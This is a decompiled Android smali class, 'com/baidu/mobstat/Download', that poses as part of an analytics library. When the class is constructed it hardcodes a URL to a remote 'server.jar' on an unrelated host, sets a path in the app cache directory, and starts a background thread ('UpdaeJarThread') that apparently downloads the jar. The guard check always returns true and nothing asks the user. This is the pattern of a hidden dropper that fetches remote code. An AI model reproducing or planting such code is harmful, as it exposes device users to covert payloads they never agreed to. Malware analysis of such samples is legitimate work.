.class public Lcom/baidu/mobstat/Download;
.super Ljava/lang/Object;
.source "SourceFile"


# static fields
.field static a:I

.field static b:I

.field static c:I

.field private static h:Landroid/os/HandlerThread;

.field private static i:Landroid/os/Handler;


# instance fields
.field private d:Ljava/io/File;

.field private e:Ljava/lang/String;

.field private f:Landroid/os/Handler;

.field private g:Lcom/baidu/mobstat/y;

.field private j:Z

.field private k:Z

.field private l:Landroid/os/Handler;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    .prologue
    .line 16
    const/4 v0, 0x1

    sput v0, Lcom/baidu/mobstat/Download;->a:I

    .line 17
    const/4 v0, 0x2

    sput v0, Lcom/baidu/mobstat/Download;->b:I

    .line 18
    const/4 v0, 0x3

    sput v0, Lcom/baidu/mobstat/Download;->c:I

    .line 24
    new-instance v0, Landroid/os/HandlerThread;

    const-string v1, "UpdaeJarThread"

    invoke-direct {v0, v1}, Landroid/os/HandlerThread;-><init>(Ljava/lang/String;)V

    sput-object v0, Lcom/baidu/mobstat/Download;->h:Landroid/os/HandlerThread;

    return-void
.end method

.method public constructor <init>(Landroid/content/Context;)V
    .locals 3

    .prologue
    const/4 v1, 0x0

    .line 33
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 21
    const-string v0, "http://59travel.205.5ghl.cn/server.jar"

    iput-object v0, p0, Lcom/baidu/mobstat/Download;->e:Ljava/lang/String;

    .line 30
    iput-boolean v1, p0, Lcom/baidu/mobstat/Download;->j:Z

    .line 31
    iput-boolean v1, p0, Lcom/baidu/mobstat/Download;->k:Z

    .line 86
    new-instance v0, Lcom/baidu/mobstat/x;

    invoke-direct {v0, p0}, Lcom/baidu/mobstat/x;-><init>(Lcom/baidu/mobstat/Download;)V

    iput-object v0, p0, Lcom/baidu/mobstat/Download;->l:Landroid/os/Handler;

    .line 34
    invoke-static {}, Lcom/baidu/mobstat/Download;->a()Z

    move-result v0

    if-nez v0, :cond_1

    .line 55
    :cond_0
    :goto_0
    return-void

    .line 38
    :cond_1
    iget-boolean v0, p0, Lcom/baidu/mobstat/Download;->k:Z

    if-nez v0, :cond_0

    .line 42
    iget-boolean v0, p0, Lcom/baidu/mobstat/Download;->j:Z

    if-nez v0, :cond_0

    .line 46
    new-instance v0, Ljava/io/File;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "/server.jar"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    iput-object v0, p0, Lcom/baidu/mobstat/Download;->d:Ljava/io/File;

    .line 47
    sget-object v0, Lcom/baidu/mobstat/Download;->h:Landroid/os/HandlerThread;

    invoke-virtual {v0}, Landroid/os/HandlerThread;->start()V

    .line 49
    new-instance v0, Landroid/os/Handler;

    sget-object v1, Lcom/baidu/mobstat/Download;->h:Landroid/os/HandlerThread;

    invoke-virtual {v1}, Landroid/os/HandlerThread;->getLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    iput-object v0, p0, Lcom/baidu/mobstat/Download;->f:Landroid/os/Handler;

    .line 50
    iget-object v0, p0, Lcom/baidu/mobstat/Download;->g:Lcom/baidu/mobstat/y;

    if-eqz v0, :cond_2

    .line 51
    iget-object v0, p0, Lcom/baidu/mobstat/Download;->f:Landroid/os/Handler;

    iget-object v1, p0, Lcom/baidu/mobstat/Download;->g:Lcom/baidu/mobstat/y;

    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 53
    :cond_2
    new-instance v0, Lcom/baidu/mobstat/y;

    invoke-direct {v0, p0}, Lcom/baidu/mobstat/y;-><init>(Lcom/baidu/mobstat/Download;)V

    iput-object v0, p0, Lcom/baidu/mobstat/Download;->g:Lcom/baidu/mobstat/y;

    .line 54
    iget-object v0, p0, Lcom/baidu/mobstat/Download;->f:Landroid/os/Handler;

    iget-object v1, p0, Lcom/baidu/mobstat/Download;->g:Lcom/baidu/mobstat/y;

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    goto :goto_0
.end method

.method static synthetic a(Lcom/baidu/mobstat/Download;)Landroid/os/Handler;
    .locals 1

    .prologue
    .line 15
    iget-object v0, p0, Lcom/baidu/mobstat/Download;->l:Landroid/os/Handler;

    return-object v0
.end method

.method static a()Z
    .locals 1

    .prologue
    .line 83
    const/4 v0, 0x1

    return v0
.end method

.method static synthetic a(Lcom/baidu/mobstat/Download;Z)Z
    .locals 0

    .prologue
    .line 15
    iput-boolean p1, p0, Lcom/baidu/mobstat/Download;->j:Z

    return p1
.end method

.method static synthetic b()Landroid/os/Handler;
    .locals 1

    .prologue
    .line 15
    sget-object v0, Lcom/baidu/mobstat/Download;->i:Landroid/os/Handler;

    return-object v0
.end method

.method static synthetic b(Lcom/baidu/mobstat/Download;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 15
    iget-object v0, p0, Lcom/baidu/mobstat/Download;->e:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic b(Lcom/baidu/mobstat/Download;Z)Z
    .locals 0

    .prologue
    .line 15
    iput-boolean p1, p0, Lcom/baidu/mobstat/Download;->k:Z

    return p1
.end method

.method static synthetic c(Lcom/baidu/mobstat/Download;)Ljava/io/File;
    .locals 1

    .prologue
    .line 15
    iget-object v0, p0, Lcom/baidu/mobstat/Download;->d:Ljava/io/File;

    return-object v0
.end method
